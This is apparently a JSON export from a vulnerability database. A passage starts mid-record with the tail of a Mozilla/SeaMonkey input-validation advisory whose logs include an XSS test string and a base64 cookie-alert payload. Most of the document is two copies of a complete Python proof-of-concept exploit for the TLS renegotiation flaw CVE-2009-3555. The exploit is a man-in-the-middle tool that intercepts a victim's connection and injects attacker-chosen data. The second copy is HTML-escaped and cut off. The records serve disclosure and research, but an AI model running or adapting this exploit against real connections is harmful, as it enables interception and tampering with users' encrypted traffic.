\"https://www.google.com/search?q=\r\na%2520%2F%3E%22%3Ch1%3Ejakjbsf%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\nModLoad: 139d0000 13a21000   C:\\Windows\\SysWOW64\\WINSPOOL.DRV\r\n(1af0.258c): Unknown exception - code 000006ba (first chance)\r\n[JavaScript Error: \"NS_ERROR_NOT_INITIALIZED: Component returned failure code: 0xc1f30001 (NS_ERROR_NOT_INITIALIZED) [nsIEditor.selectionController]\" \r\n{file: \"chrome://navigator/content/urlbarBindings.xml\" line: 107}]\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \"WARN addons.updates: Update manifest for modern@themes.mozilla.org did not contain an updates property\" \r\n{file: \"resource://gre/modules/AddonUpdateChecker.jsm\" line: 312}]\r\n[JavaScript Warning: \"WARN addons.updates: Update manifest for {972ce4c6-7e08-4474-a285-3208198ce6fd} did not contain an updates property\" \r\n{file: \"resource://gre/modules/AddonUpdateChecker.jsm\" line: 312}]\r\nversioncheck.addons.mozilla.org : server does not support RFC 5746, see CVE-2009-3555\r\nversioncheck.addons.mozilla.org : server does not support RFC 5746, see CVE-2009-3555\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different if viewed without the \r\ndocument framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==\" line: 0}]\r\n[JavaScript Warning: \"The character encoding declaration of the HTML document was not found when prescanning the first 1024 bytes of the file. \r\nWhen viewed \r\nin a differently-configured browser, this page will reload automatically. The encoding declaration needs to be moved to be within the first \r\n1024 bytes of \r\nthe file.\" {file: \"file:///C:/Users/John%20Doe/Desktop/testtesttest.html\" line: 5}]\r\n\r\n\r\nSolution - Fix & Patch:\r\n=======================\r\n2014-01-18: Vendor Fix/Patch (Mozilla Developer Team - Reward 1.500$ SWB)\r\n\r\n\r\nSecurity Risk:\r\n==============\r\nThe security risk of the persistent input validation and input filter bypass vulnerabilities are estimated as high(+).\r\n\r\n\r\nCredits & Authors:\r\n==================\r\nVulnerability Laboratory [Research Team] - Ateeq ur Rehman Khan [ateeq@evolution-sec.com] [www.vulnerability-lab.com]\r\n\r\n\r\nDisclaimer & Information:\r\n=========================\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com   \t- www.vuln-lab.com\t\t\t       - www.vulnerability-lab.com/register\r\nContact:    admin@vulnerability-lab.com \t- support@vulnerability-lab.com \t       - research@vulnerability-lab.com\r\nSection:    video.vulnerability-lab.com \t- forum.vulnerability-lab.com \t\t       - news.vulnerability-lab.com\r\nSocial:\t    twitter.com/#!/vuln_lab \t\t- facebook.com/VulnerabilityLab \t       - youtube.com/user/vulnerability0lab\r\nFeeds:\t    vulnerability-lab.com/rss/rss.php\t- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.\r\n\r\n    \t\t\t\t   \tCopyright \u00a9 2014 | Vulnerability Laboratory\r\n\r\n\r\n\r\n",
            "cvss": {
                "score": 5.8,
                "vector": "AV:N/AC:M/Au:N/C:N/I:P/A:P"
            },
            "vhref": "https://vulners.com/vulnerlab/VULNERLAB:967"
        },
        {
            "bulletinFamily": "exploit",
            "description": "TLS Renegotiation Vulnerability PoC Exploit. CVE-2009-3555. Remote exploits for multiple platform",
            "modified": "2009-12-21T00:00:00",
            "published": "2009-12-21T00:00:00",
            "id": "EDB-ID:10579",
            "href": "https://www.exploit-db.com/exploits/10579/",
            "type": "exploitdb",
            "title": "TLS Renegotiation Vulnerability PoC",
            "sourceData": "#!/usr/bin/env python\r\n\r\n######################################\r\n#                                    #\r\n#  RedTeam Pentesting GmbH           #\r\n#  kontakt@redteam-pentesting.de     #\r\n#  http://www.redteam-pentesting.de  #\r\n#                                    #\r\n######################################\r\n\r\n# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)\r\n\r\n# License\r\n# -------\r\n# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/\r\n\r\n# Timeline\r\n# --------\r\n# 2009-12-21 initial public release\r\n\r\n# Known Issues\r\n# ------------\r\n# Firefox: if it fails connecting to a TLS site too often, falls back to\r\n#          issuing SSLv2 ClientHello only until browser is restarted\r\n#\r\n# wget:    attempts SSLv2 ClientHello by default\r\n\r\n# References\r\n# ----------\r\n# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555\r\n# http://www.phonefactor.com/sslgap\r\n# http://www.extendedsubset.com/\r\n# http://www.g-sec.lu/practicaltls.pdf\r\n# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01\r\n\r\nimport tlslite\r\nimport tlslite.api\r\nimport tlslite.messages\r\nimport tlslite.constants\r\nimport struct\r\nimport socket\r\nimport threading\r\nimport array\r\nimport sys\r\nimport optparse\r\n\r\n\r\nif not hasattr(threading.Thread, 'name'):\r\n    # emulate python 2.6 threading module for earlier versions\r\n    threading.current_thread = threading.currentThread\r\n    setattr(threading.Thread, 'name',\r\n            property(threading.Thread.getName, threading.Thread.setName))\r\n\r\ndef forward(sock1, sock2):\r\n    sock1.settimeout(1.0)\r\n    while True:\r\n        try:\r\n            data = sock1.recv(4096)\r\n            if not data:\r\n                return\r\n            sock2.send(data)\r\n        except socket.error, ex_error:\r\n            if ex_error[0] == 104: # Connection reset by peer\r\n                return\r\n        except socket.timeout, ex_timeout:\r\n            pass\r\n\r\n\r\nclass MessageWrapper(object):\r\n    def __init__(self, version = (3, 1), ssl2 = False):\r\n        self.contentType = tlslite.messages.ContentType.handshake\r\n        self.ssl2 = ssl2\r\n        self.client_version = version\r\n\r\n    def setType(self, type):\r\n        self.contentType = type\r\n\r\n    def addBytes(self, bytes):\r\n        self.bytes = bytes\r\n\r\n    def write(self, trial=False):\r\n        if trial:\r\n            raise Exception('Unsupported')\r\n        return array.array('B', self.bytes)\r\n\r\ndef send_record(sock, msg_type, version_major, version_minor, record):\r\n    msg = struct.pack('!BBBH', msg_type, version_major, version_minor, len(record))\r\n    if type(record) != str:\r\n        msg += record.tostring()\r\n    else:\r\n        msg += record\r\n    sock.send(msg)\r\n\r\ndef send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):\r\n    msg = MessageWrapper(version)\r\n    msg.addBytes(struct.unpack('B'*len(messagebytes), messagebytes))\r\n    msg.setType(type)\r\n    for dummy in sslsock._sendMsg(msg, True):\r\n        pass\r\n\r\ndef decrypt_record(sslsock, type, recordbytes):\r\n    for result in sslsock._decryptRecord(type, array.array('B', recordbytes)):\r\n        pass\r\n    return result\r\n\r\ndef recv_record(sock):\r\n    try:\r\n        header = sock.recv(5)\r\n        if not header:\r\n            return None, None, None, None\r\n        msg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBBH', header)\r\n        record = ''\r\n        while len(record) != msg_length:\r\n            record += sock.recv(msg_length - len(record))\r\n        return msg_type, msg_version_major, msg_version_minor, record\r\n    except socket.error, ex:\r\n        if ex[0] == 104: # Connection reset by peer\r\n            return\r\n\r\ndef recv_clienthello(sock):\r\n    header_bytes = []\r\n    header_bytes.append(sock.recv(1))\r\n    header_bytes[0] = struct.unpack('!B', header_bytes[0])[0]\r\n    if header_bytes[0] & 0x80:\r\n        # Version 2.0 Client \"Record Layer\"\r\n        header_bytes.append(sock.recv(1))\r\n        header_bytes[1] = struct.unpack('!B', header_bytes[1])[0]\r\n        msg_length = (header_bytes[0] & 0x7f) << 8 | header_bytes[1]\r\n        msg_version_major = 2\r\n        msg_version_minor = 0\r\n        msg_type = tlslite.constants.ContentType.handshake\r\n        record = sock.recv(msg_length)\r\n    else:\r\n        header = sock.recv(4)\r\n        msg_type = header_bytes[0]\r\n        msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBH', header)\r\n        record = sock.recv(msg_length)\r\n\r\n    return msg_type, msg_version_major, msg_version_minor, record\r\n\r\ndef send_hello_request(sock):\r\n    sock.send(\"\\x16\"            # Record Layer: Handshake Message\r\n             +\"\\x03\\x01\"        # Record Layer Version: TLS 1.0\r\n             +\"\\x00\\x04\"        # Record Layer Length: 4\r\n             +\"\\x00\"            # Handshake Message Type: Hello Request\r\n             +\"\\x00\\x00\\x00\")   # Handshake Message Length: 0\r\n\r\ndef send_protocol_version_alert(sock):\r\n    sock.send(\"\\x15\"            # Record Layer: Alert\"\r\n             +\"\\x03\\x01\"        # Record Layer Version: TLS 1.0\r\n             +\"\\x00\\x02\"        # Record Layer Length: 2\r\n             +\"\\x00\"            # Alert Message: fatal\r\n             +\"\\x46\")           # Alert Message: protocol version\r\n\r\n\r\ndef handle_victim(victim, options, mitmcount):\r\n\r\n    if options.one_shot and mitmcount != 0:\r\n        print threading.current_thread().name, '--one-shot specified and initial connection already handled, forwarding only'\r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        try:\r\n            sock.connect(options.target)\r\n            print threading.current_thread().name, 'Connected to target %s:%u' % options.target\r\n        except socket.error, ex:\r\n            print threading.current_thread().name, 'Couldn\\'t connect to target %s:%u' % options.target\r\n            print threading.current_thread().name, 'Error code %u, \\'%s\\'' % (ex[0], ex[1])\r\n            sys.exit(1)\r\n\r\n        t1 = threading.Thread(target=forward, args=(sock, victim))\r\n        t1.start()\r\n\r\n        t2 = threading.Thread(target=forward, args=(victim, sock))\r\n        t2.start()\r\n\r\n        t1.join()\r\n        sock.close()\r\n\r\n        t2.join()\r\n        victim.close()\r\n        return\r\n\r\n    # obtain initial \"client hello\" message\r\n    msg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)\r\n    if msg_version_major == 2:\r\n        print threading.current_thread().name, \"client sent SSLv2 client hello message, exiting thread\"\r\n        return\r\n\r\n    tls_version = (msg_version_major, msg_version_minor)\r\n    type, length, version_major, version_minor, random, session_id_length = struct.unpack('!B3sBB32sB', hello_msg[:39])\r\n    resume_session = (session_id_length != 0)\r\n    if resume_session:\r\n        print threading.current_thread().name, \"client attempting to resume session\"\r\n\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    try:\r\n        sock.connect(options.target)\r\n        print threading.current_thread().name, 'Connected to target %s:%u' % options.target\r\n    except socket.error, ex:\r\n        print threading.current_thread().name, 'Couldn\\'t connect to target %s:%u' % options.target\r\n        print threading.current_thread().name, 'Error code %u, \\'%s\\'' % (ex[0], ex[1])\r\n        sys.exit(1)\r\n\r\n\r\n    sslsock = tlslite.api.TLSConnection(sock)\r\n    handshake_settings = tlslite.HandshakeSettings.HandshakeSettings()\r\n    handshake_settings.minVersion = tls_version\r\n    handshake_settings.maxVersion = tls_version\r\n    sslsock.handshakeClientCert(settings = handshake_settings)\r\n\r\n    # inject prefix\r\n    sslsock.write(options.inject)\r\n    print threading.current_thread().name, 'Injected %s' % repr(options.inject)\r\n\r\n    # send original \"client hello\" message over the encrypted channel\r\n    send_encapsulated(sslsock, 22, hello_msg, tls_version)\r\n\r\n    # now receive serveral TLS messages from the server, decrypt them, and forward\r\n    # them to the client, until the server sends \"server hello done\"\r\n    # these messages include \"server hello\", \"certificate\", \"server key exchange\",\r\n    # unless the client is trying to resume a previous session\r\n    print threading.current_thread().name, \"about to receive server handshake messages\"\r\n    server_handshake_done = False\r\n    while not server_handshake_done:\r\n        msg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)\r\n        if result:\r\n            result = decrypt_record(sslsock, msg_type, result)\r\n            send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\r\n            if result[0] == 0x0e: # server hello done - should terminate handshake\r\n                server_handshake_done = True\r\n            elif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant\r\n                server_handshake_done = True\r\n        else:\r\n            print threading.current_thread().name, 'receive from server failed, exiting thread'\r\n            return\r\n    print threading.current_thread().name, \"server handshake done\"\r\n\r\n\r\n    # now its the the client's turn to send some messages, e.g.\r\n    # \"client key exchange\" and \"change cipher spec\"\r\n    print threading.current_thread().name, \"about to receive client handshake messages\"\r\n    handshake_finished = False\r\n    while not handshake_finished:\r\n        msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\r\n        print threading.current_thread().name, msg_type\r\n        send_encapsulated(sslsock, msg_type, record, tls_version)\r\n        if msg_type == 0x14: # change cipher spec\r\n            handshake_finished = True\r\n\r\n    print threading.current_thread().name, \"client handshake done\"\r\n\r\n    # message after \"change cipher spec\" must be sent in the \"clear\"\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\r\n    send_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)\r\n\r\n    # server should now send \"change cipher spec\" message, we decrypt and send that to the victim\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\r\n    result = decrypt_record(sslsock, msg_type, record)\r\n    send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\r\n\r\n    # finalize handshake\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\r\n    if record:\r\n        send_record(victim, msg_type, msg_version_major, msg_version_minor, record)\r\n    else:\r\n        sslsock.sock.close()\r\n        victim.close()\r\n        del sslsock\r\n        return\r\n\r\n\r\n\r\n    # the rest is just forwarding TLS records between both parties,\r\n    # which we cannot interfere with anymore, apart from dropping server\r\n    # responses\r\n    if options.drop:\r\n        sslsock.sock.close()\r\n        del sslsock\r\n    else:\r\n        t1 = threading.Thread(target=forward, args=(sslsock.sock, victim))\r\n        t1.start()\r\n\r\n    t2 = threading.Thread(target=forward, args=(victim, sslsock.sock))\r\n    t2.start()\r\n\r\n    if not options.drop:\r\n        t1.join()\r\n        sslsock.sock.close()\r\n\r\n    t2.join()\r\n    victim.close()\r\n\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    parser = optparse.OptionParser()\r\n    parser.add_option('-l', '--listen', dest='listen_port', help='port to listen on', metavar='PORT', type='int', default=8443)\r\n    parser.add_option('-b', '--bind', dest='bind_address', help='address to bind to', metavar='ADDRESS', default='0.0.0.0')\r\n    parser.add_option('-t', '--target', dest='target', help='host and port to connect to', metavar='HOST:PORT' )\r\n    parser.add_option('-i', '--inject', dest='inject', help='string to inject', metavar='DATA')\r\n    parser.add_option('', '--inject-file', dest='inject_file', help='inject data from a file', metavar='FILE')\r\n    parser.add_option('', '--inject-base64', dest='inject_base64', help='string to inject, base64-encoded', metavar='DATA')\r\n    parser.add_option('-o', '--one-shot', dest='one_shot', action='store_true', help='only mitm the first connection attempt, forward all other connections')\r\n    parser.add_option('-d', '--drop-responses', dest='drop', action=\"store_true\", default=False, help='drop server responses after renegotiating')\r\n\r\n    (options, args) = parser.parse_args()\r\n\r\n    if len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:\r\n        print 'Exactly one injection option must be specified'\r\n        sys.exit(1)\r\n\r\n    if options.inject_file:\r\n        try:\r\n            options.inject = open(options.inject_file, 'r').read()\r\n        except IOError, ex:\r\n            print ex\r\n            sys.exit(1)\r\n\r\n    if options.inject_base64:\r\n        import base64\r\n        try:\r\n            options.inject = base64.decodestring(options.inject_base64)\r\n        except base64.binascii.Error, ex:\r\n            print 'Error decoding base64 data: %s' % ex\r\n            sys.exit(1)\r\n\r\n\r\n    if not options.listen_port or \\\r\n       not options.bind_address or \\\r\n       not options.target or \\\r\n       not options.inject:\r\n        parser.print_help()\r\n        sys.exit(1)\r\n\r\n    target = options.target.split(':')\r\n    if len(target)==2:\r\n        try:\r\n            target[1] = int(target[1])\r\n        except ValueError:\r\n            target[1] = None\r\n    if len(target)!=2 or not target[0] or not target[1]:\r\n        print 'Target \\'%s\\' not in format HOST:PORT' % options.target\r\n        sys.exit(1)\r\n\r\n    options.target = tuple(target)\r\n\r\n    try:\r\n        listensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        listensocket.bind((options.bind_address, options.listen_port))\r\n        print 'Listening on %s:%u' % (options.bind_address, options.listen_port)\r\n    except socket.error, ex:\r\n        print 'Couldn\\'t listen on %s:%u' % (options.bind_address, options.listen_port)\r\n        print 'Error code %u, \\'%s\\'' % (ex[0], ex[1])\r\n        sys.exit(1)\r\n\r\n    listensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    listensocket.listen(5)\r\n\r\n    mitmcount = 0\r\n\r\n    while True:\r\n        try:\r\n            victim, victimaddr = listensocket.accept()\r\n            print 'New connection from %s:%u' % victimaddr\r\n\r\n            threading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()\r\n            mitmcount += 1\r\n\r\n        except KeyboardInterrupt, ex:\r\n            print '\\nAborted by user, exiting...'\r\n            listensocket.close()\r\n            sys.exit(1)\r\n\r\n",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:10579"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2009-12-21T00:00:00",
            "published": "2009-12-21T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-18637",
            "id": "SSV:18637",
            "type": "seebug",
            "title": "TLS Renegotiation Vulnerability PoC Exploit",
            "sourceData": "\n                                                #!/usr/bin/env python\r\n\r\n######################################\r\n#                                    #\r\n#  RedTeam Pentesting GmbH           #\r\n#  kontakt@redteam-pentesting.de     #\r\n#  http://www.redteam-pentesting.de  #\r\n#                                    #\r\n######################################\r\n\r\n# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)\r\n\r\n# License\r\n# -------\r\n# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/\r\n\r\n# Timeline\r\n# --------\r\n# 2009-12-21 initial public release\r\n\r\n# Known Issues\r\n# ------------\r\n# Firefox: if it fails connecting to a TLS site too often, falls back to\r\n#          issuing SSLv2 ClientHello only until browser is restarted\r\n#\r\n# wget:    attempts SSLv2 ClientHello by default\r\n\r\n# References\r\n# ----------\r\n# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555\r\n# http://www.phonefactor.com/sslgap\r\n# http://www.extendedsubset.com/\r\n# http://www.g-sec.lu/practicaltls.pdf\r\n# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01\r\n\r\nimport tlslite\r\nimport tlslite.api\r\nimport tlslite.messages\r\nimport tlslite.constants\r\nimport struct\r\nimport socket\r\nimport threading\r\nimport array\r\nimport sys\r\nimport optparse\r\n\r\n\r\nif not hasattr(threading.Thread, 'name'):\r\n    # emulate python 2.6 threading module for earlier versions\r\n    threading.current_thread = threading.currentThread\r\n    setattr(threading.Thread, 'name',\r\n            property(threading.Thread.getName, threading.Thread.setName))\r\n\r\ndef forward(sock1, sock2):\r\n    sock1.settimeout(1.0)\r\n    while True:\r\n        try:\r\n            data = sock1.recv(4096)\r\n            if not data:\r\n                return\r\n            sock2.send(data)\r\n        except socket.error, ex_error:\r\n            if ex_error[0] == 104: # Connection reset by peer\r\n                return\r\n        except socket.timeout, ex_timeout:\r\n            pass\r\n\r\n\r\nclass MessageWrapper(object):\r\n    def __init__(self, version = (3, 1), ssl2 = False):\r\n        self.contentType = tlslite.messages.ContentType.handshake\r\n        self.ssl2 = ssl2\r\n        self.client_version = version\r\n\r\n    def setType(self, type):\r\n        self.contentType = type\r\n\r\n    def addBytes(self, bytes):\r\n        self.bytes = bytes\r\n\r\n    def write(self, trial=False):\r\n        if trial:\r\n            raise Exception('Unsupported')\r\n        return array.array('B', self.bytes)\r\n\r\ndef send_record(sock, msg_type, version_major, version_minor, record):\r\n    msg = struct.pack('!BBBH', msg_type, version_major, version_minor, len(record))\r\n    if type(record) != str:\r\n        msg += record.tostring()\r\n    else:\r\n        msg += record\r\n    sock.send(msg)\r\n\r\ndef send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):\r\n    msg = MessageWrapper(version)\r\n    msg.addBytes(struct.unpack('B'*len(messagebytes), messagebytes))\r\n    msg.setType(type)\r\n    for dummy in sslsock._sendMsg(msg, True):\r\n        pass\r\n\r\ndef decrypt_record(sslsock, type, recordbytes):\r\n    for result in sslsock._decryptRecord(type, array.array('B', recordbytes)):\r\n        pass\r\n    return result\r\n\r\ndef recv_record(sock):\r\n    try:\r\n        header = sock.recv(5)\r\n        if not header:\r\n            return None, None, None, None\r\n        msg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBBH', header)\r\n        record = ''\r\n        while len(record) != msg_length:\r\n            record += sock.recv(msg_length - len(record))\r\n        return msg_type, msg_version_major, msg_version_minor, record\r\n    except socket.error, ex:\r\n        if ex[0] == 104: # Connection reset by peer\r\n            return\r\n\r\ndef recv_clienthello(sock):\r\n    header_bytes = []\r\n    header_bytes.append(sock.recv(1))\r\n    header_bytes[0] = struct.unpack('!B', header_bytes[0])[0]\r\n    if header_bytes[0] &amp; 0x80:\r\n        # Version 2.0 Client &quot;Record Layer&quot;\r\n        header_bytes.append(sock.recv(1))\r\n        header_bytes[1] = struct.unpack('!B', header_bytes[1])[0]\r\n        msg_length = (header_bytes[0] &amp; 0x7f) &lt;&lt; 8 | header_bytes[1]\r\n        msg_version_major = 2\r\n        msg_version_minor = 0\r\n        msg_type = tlslite.constants.ContentType.handshake\r\n        record = sock.recv(msg_length)\r\n    else:\r\n        header = sock.recv(4)\r\n        msg_type = header_bytes[0]\r\n        msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBH', header)\r\n        record = sock.recv(msg_length)\r\n\r\n    return msg_type, msg_version_major, msg_version_minor, record\r\n\r\ndef send_hello_request(sock):\r\n    sock.send(&quot;\\x16&quot;            # Record Layer: Handshake Message\r\n             +&quot;\\x03\\x01&quot;        # Record Layer Version: TLS 1.0\r\n             +&quot;\\x00\\x04&quot;        # Record Layer Length: 4\r\n             +&quot;\\x00&quot;            # Handshake Message Type: Hello Request\r\n             +&quot;\\x00\\x00\\x00&quot;)   # Handshake Message Length: 0\r\n\r\ndef send_protocol_version_alert(sock):\r\n    sock.send(&quot;\\x15&quot;            # Record Layer: Alert&quot;\r\n             +&quot;\\x03\\x01&quot;        # Record Layer Version: TLS 1.0\r\n             +&quot;\\x00\\x02&quot;        # Record Layer Length: 2\r\n             +&quot;\\x00&quot;            # Alert Message: fatal\r\n             +&quot;\\x46&quot;)           # Alert Message: protocol version\r\n\r\n\r\ndef handle_victim(victim, options, mitmcount):\r\n\r\n    if options.one_shot and mitmcount != 0:\r\n        print threading.current_thread().name, '--one-shot specified and initial connection already handled, forwarding only'\r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        try:\r\n            sock.connect(options.target)\r\n            print threading.current_thread().name, 'Connected to target %s:%u' % options.target\r\n        except socket.error, ex:\r\n            print threading.current_thread().name, 'Couldn\\'t connect to target %s:%u' % options.target\r\n            print threading.current_thread().name, 'Error code %u, \\'%s\\'' % (ex[0], ex[1])\r\n            sys.exit(1)\r\n\r\n        t1 = threading.Thread(target=forward, args=(sock, victim))\r\n        t1.start()\r\n\r\n        t2 = threading.Thread(target=forward, args=(victim, sock))\r\n        t2.start()\r\n\r\n        t1.join()\r\n        sock.close()\r\n\r\n        t2.join()\r\n        victim.close()\r\n        return\r\n\r\n    # obtain initial &quot;client hello&quot; message\r\n    msg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)\r\n    if msg_version_major == 2:\r\n        print threading.current_thread().name, &quot;client sent SSLv2 client hello message, exiting thread&quot;\r\n        return\r\n\r\n    tls_version = (msg_version_major, msg_version_minor)\r\n    type, length, version_major, version_minor, random, session_id_length = struct.unpack('!B3sBB32sB', hello_msg[:39])\r\n    resume_session = (session_id_length != 0)\r\n    if resume_session:\r\n        print threading.current_thread().name, &quot;client attempting to resume session&quot;\r\n\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    try:\r\n        sock.connect(options.target)\r\n        print threading.current_thread().name, 'Connected to target %s:%u' % options.target\r\n    except socket.error, ex:\r\n        print threading.current_thread().name, 'Couldn\\'t connect to target %s:%u' % options.target\r\n        print threading.current_thread().name, 'Error code %u, \\'%s\\'' % (ex[0], ex[1])\r\n        sys.exit(1)\r\n\r\n\r\n    sslsock = tlslite.api.TLSConnection(sock)\r\n    handshake_settings = tlslite.HandshakeSettings.HandshakeSettings()\r\n    handshake_settings.minVersion = tls_version\r\n    handshake_settings.maxVersion = tls_version\r\n    sslsock.handshakeClientCert(settings = handshake_settings)\r\n\r\n    # inject prefix\r\n    sslsock.write(options.inject)\r\n    print threading.current_thread().name, 'Injected %s' % repr(options.inject)\r\n\r\n    # send original &quot;client hello&quot; message over the encrypted channel\r\n    send_encapsulated(sslsock, 22, hello_msg, tls_version)\r\n\r\n    # now receive serveral TLS messages from the server, decrypt them, and forward\r\n    # them to the client, until the server sends &quot;server hello done&quot;\r\n    # these messages include &quot;server hello&quot;, &quot;certificate&quot;, &quot;server key exchange&quot;,\r\n    # unless the client is trying to resume a previous session\r\n    print threading.current_thread().name, &quot;about to receive server handshake messages&quot;\r\n    server_handshake_done = False\r\n    while not server_handshake_done:\r\n        msg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)\r\n        if result:\r\n            result = decrypt_record(sslsock, msg_type, result)\r\n            send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\r\n            if result[0] == 0x0e: # server hello done - should terminate handshake\r\n                server_handshake_done = True\r\n            elif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant\r\n                server_handshake_done = True\r\n        else:\r\n            print threading.current_thread().name, 'receive from server failed, exiting thread'\r\n            return\r\n    print threading.current_thread().name, &quot;server handshake done&quot;\r\n\r\n\r\n    # now its the the client's turn to send some messages, e.g.\r\n    # &quot;client key exchange&quot; and &quot;change cipher spec&quot;\r\n    print threading.current_thread().name, &quot;about to receive client handshake messages&quot;\r\n    handshake_finished = False\r\n    while not handshake_finished:\r\n        msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\r\n        print threading.current_thread().name, msg_type\r\n        send_encapsulated(sslsock, msg_type, record, tls_version)\r\n        if msg_type == 0x14: # change cipher spec\r\n            handshake_finished = True\r\n\r\n    print threading.current_thread().name, &quot;client handshake done&quot;\r\n\r\n    # message after &quot;change cipher spec&quot; must be sent in the &quot;clear&quot;\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\r\n    send_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)\r\n\r\n    # server should now send &quot;change cipher spec&quot; message, we decrypt and send that to the victim\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\r\n    result = decrypt_record(sslsock, msg_type, record)\r\n    send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\r\n\r\n    # finalize handshake\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\r\n    if record:\r\n        send_record(victim, msg_type, msg_version_major, msg_version_minor, record)\r\n    else:\r\n        sslsock.sock.close()\r\n        victim.close()\r\n        del sslsock\r\n        return\r\n\r\n\r\n\r\n    # the rest is just forwarding TLS records between both parties,\r\n    # which we cannot interfere with anymore, apart from dropping server\r\n    # responses\r\n    if options.drop:\r\n        sslsock.sock.close()\r\n        del sslsock\r\n    else:\r\n        t1 = threading.Thread(target=forward, args=(sslsock.sock, victim))\r\n        t1.start()\r\n\r\n    t2 = threading.Thread(target=forward, args=(victim, sslsock.sock))\r\n    t2.start()\r\n\r\n    if not options.drop:\r\n        t1.join()\r\n        sslsock.sock.close()\r\n\r\n    t2.join()\r\n    victim.close()\r\n\r\n\r\n\r\nif __name__ == &quot;__main__&quot;:\r\n    parser = optparse.OptionParser()\r\n    parser.add_option('-l', '--listen', dest='listen_port', help='port to listen on', metavar='PORT', type='int', default=8443)\r\n    parser.add_option('-b', '--bind', dest='bind_address', help='address to bind to', metavar='ADDRESS', default='0.0.0.0')\r\n    parser.add_option('-t', '--target', dest='target', help='host and port to connect to', metavar='HOST:PORT' )\r\n    parser.add_option('-i', '--inject', dest='inject', help='string to inject', metavar='DATA')\r\n    parser.add_option('', '--inject-file', dest='inject_file', help='inject data from a file', metavar='FILE')\r\n    parser.add_option('', '--inject-base64', dest='inject_base64', help='string to inject, base64-encoded', metavar='DATA')\r\n    parser.add_option('-o', '--one-shot', dest='one_shot', action='store_true', help='only mitm the first connection attempt, forward all other connections')\r\n    parser.add_option('-d', '--drop-responses', dest='drop', action=&quot;store_true&quot;, default=False, help='drop server responses after 